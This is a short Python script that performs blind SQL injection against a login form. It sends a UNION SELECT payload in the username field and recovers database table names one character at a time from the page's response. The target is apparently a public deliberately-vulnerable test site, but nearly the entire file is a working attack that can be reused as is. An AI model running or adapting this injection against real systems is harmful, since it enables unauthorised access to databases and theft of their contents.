import requests
import sys

def tables(url):
    words = "0123456789mabcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    l,i,b = len(words), 0, ""
    while i < l:
        data = {
            "username": "' union select 1,2,3,4 from information_schema.tables where table_schema ='mywebsite' and table_name like binary '" + b + words[i] + "%'-- -",
            "password": "whocares"
        }
        r = requests.post(url, data=data)
        if "Hello there!" in r.text:
            b += words[i]
            i = 0
        else:
            sys.stdout.write(f"\rExtracting table: {b}{words[i].ljust(20)}")
            sys.stdout.flush()
            i += 1

if __name__ == "__main__":
    url = "http://testphp.vulnweb.com/signup.php"
    tables(url)
    print("\n")
